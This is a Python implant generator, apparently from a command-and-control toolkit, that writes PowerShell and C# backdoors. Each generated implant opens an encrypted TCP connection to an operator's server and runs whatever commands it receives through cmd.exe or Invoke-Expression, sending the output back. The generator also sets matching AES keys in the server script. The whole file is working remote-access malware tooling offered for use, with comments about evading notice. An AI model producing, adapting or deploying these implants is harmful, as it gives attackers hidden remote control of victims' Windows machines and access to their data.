#!/usr/bin/env python3
import argparse
import json
import os
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

class ImplantGenerator:
    def __init__(self):
        self.templates = {
            'powershell': self.powershell_template,
            'csharp': self.csharp_template
        }
        self.output_dir = 'implants'
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
    
    def generate_key(self):
        """Generate a random AES-256 key"""
        return ''.join(random.choices('0123456789abcdef', k=32))
    
    def generate_iv(self):
        """Generate a random AES IV"""
        return ''.join(random.choices('0123456789abcdef', k=32))
    
    def generate_random_string(self, length=8):
        """Generate a random string for variable names"""
        return ''.join(random.choices(string.ascii_lowercase, k=length))
    
    def powershell_template(self, config):
        """Generate PowerShell implant"""
        key_hex = config['key']
        iv_hex = config['iv']
        server = config['server']
        port = config['port']
        
        # Convert hex to byte array format
        key_bytes = ', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])
        iv_bytes = ', '.join([f'0x{iv_hex[i:i+2]}' for i in range(0, len(iv_hex), 2)])
        
        return f'''param(
    [string]$server = "{server}",
    [int]$port = {port}
)

$KEY = [Byte[]] ({key_bytes})
$IV  = [Byte[]] ({iv_bytes})

function Decrypt($b64) {{
    try {{
        $data = [Convert]::FromBase64String($b64)
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $KEY
        $aes.IV = $IV
        $aes.Mode = 'CBC'
        $aes.Padding = 'PKCS7'
        $dec = $aes.CreateDecryptor()
        $ms = $null
        $cs = $null
        $sr = $null
        try {{
            $ms = New-Object IO.MemoryStream(,$data)
            $cs = New-Object Security.Cryptography.CryptoStream($ms, $dec, 'Read')
            $sr = New-Object IO.StreamReader($cs)
            $sr.ReadToEnd()
        }} finally {{
            if ($sr) {{ $sr.Close() }}
            if ($cs) {{ $cs.Close() }}
            if ($ms) {{ $ms.Close() }}
            if ($dec) {{ $dec.Dispose() }}
            if ($aes) {{ $aes.Dispose() }}
        }}
    }} catch {{
        Write-Error "[!] Decrypt error: $_"
        return "[!] Decrypt error"
    }}
}}

function Encrypt($msg) {{
    try {{
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $KEY
        $aes.IV = $IV
        $aes.Mode = 'CBC'
        $aes.Padding = 'PKCS7'
        $enc = $aes.CreateEncryptor()
        $ms = $null
        $cs = $null
        $sw = $null
        try {{
            $ms = New-Object IO.MemoryStream
            $cs = New-Object Security.Cryptography.CryptoStream($ms, $enc, 'Write')
            $sw = New-Object IO.StreamWriter($cs)
            $sw.Write($msg)
            $sw.Close()
            [Convert]::ToBase64String($ms.ToArray())
        }} finally {{
            if ($sw) {{ $sw.Close() }}
            if ($cs) {{ $cs.Close() }}
            if ($ms) {{ $ms.Close() }}
            if ($enc) {{ $enc.Dispose() }}
            if ($aes) {{ $aes.Dispose() }}
        }}
    }} catch {{
        Write-Error "[!] Encrypt error: $_"
        return "[!] Encrypt error"
    }}
}}

function Start-Stage0($serverIP, $serverPort) {{
    $client = $null
    $stream = $null
    $writer = $null
    $exiting = $false
    try {{
        $client = New-Object Net.Sockets.TcpClient($serverIP, [int]$serverPort)
        $stream = $client.GetStream()
        $writer = New-Object IO.StreamWriter($stream)
        $writer.AutoFlush = $true

        # Send encrypted connection banner
        $msg = Encrypt("[+] PowerShell Stage 0 connected") + "`n"
        $writer.WriteLine($msg)

        while ($true) {{
            try {{
                # Read until newline
                $in = ""
                while ($true) {{
                    $byte = $stream.ReadByte()
                    if ($byte -eq -1 -or $byte -eq 10) {{ break }}
                    $in += [char]$byte
                }}

                $cmd = Decrypt($in).Trim()

                # Check for EXIT command
                if ($cmd.ToUpper() -eq "EXIT") {{
                    try {{
                        $byeMsg = Encrypt("[!] Implant exiting. Goodbye!`n")
                        $writer.WriteLine($byeMsg)
                    }} catch {{
                        # Ignore errors on exit
                    }}
                    $exiting = $true
                    break
                }}

                # Execute command
                $out = $null
                if ($cmd.ToUpper().StartsWith("CMD ")) {{
                    try {{
                        $result = cmd.exe /c $cmd.Substring(4) 2>&1
                        if ($result -is [System.Array]) {{
                            $out = $result -join "`n"
                        }} else {{
                            $out = $result
                        }}
                        if (-not $out) {{ $out = "[!] No output" }}
                    }} catch {{
                        $out = "[!] CMD error: $_"
                    }}
                }}
                elseif ($cmd.ToUpper() -eq "WHOAMI") {{
                    # OPSEC-safe whoami using environment variables
                    $out = "$env:USERDOMAIN\\$env:USERNAME"
                }}
                elseif ($cmd.ToUpper() -eq "HOSTNAME") {{
                    # OPSEC-safe hostname using environment variables
                    $out = $env:COMPUTERNAME
                }}
                elseif ($cmd) {{
                    try {{
                        $out = (Invoke-Expression $cmd 2>&1 | Out-String).Trim()
                        if (-not $out) {{ $out = "[!] No output" }}
                    }} catch {{
                        $out = "[!] PowerShell error: $_"
                    }}
                }}
                else {{
                    $out = "[!] Invalid command"
                }}

                $enc = Encrypt($out + "`n")
                $writer.WriteLine($enc)
            }} catch {{
                if (-not $exiting) {{
                    $errMsg = "[!] Error in command loop: $_"
                    Write-Error $errMsg
                    try {{
                        $enc = Encrypt($errMsg + "`n")
                        $writer.WriteLine($enc)
                    }} catch {{}}
                }}
                break
            }}
        }}
    }} catch {{
        Write-Error "[!] Connection error: $_"
    }} finally {{
        if ($writer) {{ $writer.Close() }}
        if ($stream) {{ $stream.Close() }}
        if ($client) {{ $client.Close() }}
    }}
}}

Start-Stage0 $server $port
'''
    
    def csharp_template(self, config):
        """Generate C# implant"""
        key_hex = config['key']
        iv_hex = config['iv']
        server = config['server']
        port = config['port']
        
        # Convert hex to byte array format
        key_bytes = ', '.join([f'0x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])
        iv_bytes = ', '.join([f'0x{iv_hex[i:i+2]}' for i in range(0, len(iv_hex), 2)])
        
        return f'''using System;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;
using System.Diagnostics;

class Stage0
{{
    static byte[] KEY = new byte[] {{ {key_bytes} }};
    static byte[] IV = new byte[] {{ {iv_bytes} }};
    static string SERVER = "{server}";
    static int PORT = {port};

    static string Decrypt(string b64)
    {{
        try
        {{
            byte[] data = Convert.FromBase64String(b64);
            using (Aes aes = Aes.Create())
            {{
                aes.Key = KEY;
                aes.IV = IV;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                
                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                using (MemoryStream ms = new MemoryStream(data))
                using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                using (StreamReader sr = new StreamReader(cs))
                {{
                    return sr.ReadToEnd();
                }}
            }}
        }}
        catch
        {{
            return "[!] Decrypt error";
        }}
    }}

    static string Encrypt(string msg)
    {{
        try
        {{
            using (Aes aes = Aes.Create())
            {{
                aes.Key = KEY;
                aes.IV = IV;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                
                using (ICryptoTransform encryptor = aes.CreateEncryptor())
                using (MemoryStream ms = new MemoryStream())
                using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                using (StreamWriter sw = new StreamWriter(cs))
                {{
                    sw.Write(msg);
                    sw.Close();
                    return Convert.ToBase64String(ms.ToArray());
                }}
            }}
        }}
        catch
        {{
            return "[!] Encrypt error";
        }}
    }}

    static void Main()
    {{
        try
        {{
            using (TcpClient client = new TcpClient(SERVER, PORT))
            using (NetworkStream stream = client.GetStream())
            using (StreamWriter writer = new StreamWriter(stream))
            {{
                writer.AutoFlush = true;
                
                // Send encrypted connection banner
                string banner = Encrypt("[+] C# Stage 0 connected\\n");
                writer.WriteLine(banner);
                
                while (true)
                {{
                    try
                    {{
                        // Read command
                        StringBuilder input = new StringBuilder();
                        int byte_read;
                        while ((byte_read = stream.ReadByte()) != -1 && byte_read != 10)
                        {{
                            input.Append((char)byte_read);
                        }}
                        
                        string cmd = Decrypt(input.ToString()).Trim();
                        
                        if (cmd.ToUpper() == "EXIT")
                        {{
                            string bye = Encrypt("[!] Implant exiting. Goodbye!\\n");
                            writer.WriteLine(bye);
                            break;
                        }}
                        
                        // Execute command
                        string output = "";
                        if (cmd.ToUpper().StartsWith("CMD "))
                        {{
                            try
                            {{
                                ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd.Substring(4));
                                psi.RedirectStandardOutput = true;
                                psi.RedirectStandardError = true;
                                psi.UseShellExecute = false;
                                psi.CreateNoWindow = true;
                                
                                using (Process p = Process.Start(psi))
                                {{
                                    output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                                }}
                            }}
                            catch (Exception ex)
                            {{
                                output = "[!] CMD error: " + ex.Message;
                            }}
                        }}
                        else if (cmd.ToUpper() == "WHOAMI")
                        {{
                            output = System.Environment.UserDomainName + "\\\\" + System.Environment.UserName;
                        }}
                        else if (cmd.ToUpper() == "HOSTNAME")
                        {{
                            output = System.Environment.MachineName;
                        }}
                        else
                        {{
                            output = "[!] Command not implemented in C# version";
                        }}
                        
                        if (string.IsNullOrEmpty(output))
                            output = "[!] No output";
                        
                        string encrypted = Encrypt(output + "\\n");
                        writer.WriteLine(encrypted);
                    }}
                    catch (Exception ex)
                    {{
                        string error = Encrypt("[!] Error: " + ex.Message + "\\n");
                        try {{ writer.WriteLine(error); }} catch {{}}
                        break;
                    }}
                }}
            }}
        }}
        catch (Exception ex)
        {{
            Console.WriteLine("[!] Connection error: " + ex.Message);
        }}
    }}
}}
'''
    
    def update_server_keys(self, config):
        """Update server.py with new encryption keys"""
        try:
            # Read current server.py
            with open('server.py', 'r') as f:
                content = f.read()
            
            # Convert hex keys to byte array format
            key_hex = config['key']
            iv_hex = config['iv']
            
            key_bytes = ''.join([f'\\x{key_hex[i:i+2]}' for i in range(0, len(key_hex), 2)])
            iv_bytes = ''.join([f'\\x{iv_hex[i:i+2]}' for i in range(0, len(iv_hex), 2)])
            
            # Create new key and IV lines
            new_key_line = f'KEY = b"{key_bytes}"'
            new_iv_line = f'IV  = b"{iv_bytes}"'
            
            # Replace the key and IV lines
            lines = content.split('\n')
            for i, line in enumerate(lines):
                if line.strip().startswith('KEY = b"'):
                    lines[i] = new_key_line
                elif line.strip().startswith('IV  = b"'):
                    lines[i] = new_iv_line
            
            # Write updated server.py
            with open('server.py', 'w') as f:
                f.write('\n'.join(lines))
            
            return True
        except Exception as e:
            print(f"[!] Warning: Could not update server.py: {e}")
            return False
    
    def generate(self, language, config, output_file=None, update_server=True):
        """Generate implant in specified language"""
        if language not in self.templates:
            raise ValueError(f"Unsupported language: {language}")
        
        # Generate random keys if not provided
        if 'key' not in config:
            config['key'] = self.generate_key()
        if 'iv' not in config:
            config['iv'] = self.generate_iv()
        
        # Update server.py with new keys if requested
        if update_server:
            if self.update_server_keys(config):
                print("[+] Updated server.py with new encryption keys")
        
        # Generate the implant
        implant_code = self.templates[language](config)
        
        # Determine output filename
        if not output_file:
            extensions = {
                'powershell': '.ps1',
                'csharp': '.cs'
            }
            output_file = f"implant_{language}{extensions[language]}"
        
        # Write to file
        output_path = os.path.join(self.output_dir, output_file)
        with open(output_path, 'w') as f:
            f.write(implant_code)
        
        # Create config file
        config_file = output_file.replace('.', '_') + '_config.json'
        config_path = os.path.join(self.output_dir, config_file)
        with open(config_path, 'w') as f:
            json.dump(config, f, indent=2)
        
        return output_path, config_path

    def generate_all(self, config, output_prefix=None, update_server=True):
        results = []
        for idx, lang in enumerate(['powershell', 'csharp']):
            out = None
            if output_prefix:
                extensions = {'powershell': '.ps1', 'csharp': '.cs'}
                out = f"{output_prefix}_{lang}{extensions[lang]}"
            results.append(self.generate(lang, config, out, update_server and idx == 0))
        return results

def main():
    parser = argparse.ArgumentParser(description='Generate Stage 0 implants in PowerShell or C#')
    parser.add_argument('language', choices=['powershell', 'csharp', 'all'], 
                       help='Target language for implant')
    parser.add_argument('--server', default='127.0.0.1', help='C2 server IP address')
    parser.add_argument('--port', type=int, default=4343, help='C2 server port')
    parser.add_argument('--key', help='AES-256 key (hex format, 32 bytes)')
    parser.add_argument('--iv', help='AES IV (hex format, 16 bytes)')
    parser.add_argument('--output', help='Output filename or prefix (for all)')
    parser.add_argument('--config', help='Load configuration from JSON file')
    parser.add_argument('--no-update-server', action='store_true', help='Do not update server.py with new keys')
    
    args = parser.parse_args()
    
    # Load config from file if provided
    config = {}
    if args.config:
        with open(args.config, 'r') as f:
            config = json.load(f)
    
    # Override with command line arguments
    if args.server:
        config['server'] = args.server
    if args.port:
        config['port'] = args.port
    if args.key:
        config['key'] = args.key
    if args.iv:
        config['iv'] = args.iv
    
    generator = ImplantGenerator()
    try:
        if args.language == 'all':
            if 'key' not in config:
                config['key'] = generator.generate_key()
            if 'iv' not in config:
                config['iv'] = generator.generate_iv()
            results = generator.generate_all(config, args.output, not args.no_update_server)
            print("[+] Generated all implant types:")
            for (impl, conf) in results:
                print(f"    {impl} (config: {conf})")
            print(f"[+] Server: {config.get('server', '127.0.0.1')}:{config.get('port', 4343)}")
            print(f"[+] Key: {config['key']}")
            print(f"[+] IV: {config['iv']}")
        else:
            implant_file, config_file = generator.generate(args.language, config, args.output, not args.no_update_server)
            print(f"[+] Generated {args.language} implant: {implant_file}")
            print(f"[+] Configuration saved to: {config_file}")
            print(f"[+] Server: {config.get('server', '127.0.0.1')}:{config.get('port', 4343)}")
            if 'key' in config:
                print(f"[+] Key: {config['key']}")
            if 'iv' in config:
                print(f"[+] IV: {config['iv']}")
    except Exception as e:
        print(f"[!] Error generating implant: {e}")
        return 1
    
    return 0

if __name__ == '__main__':
    exit(main()) 
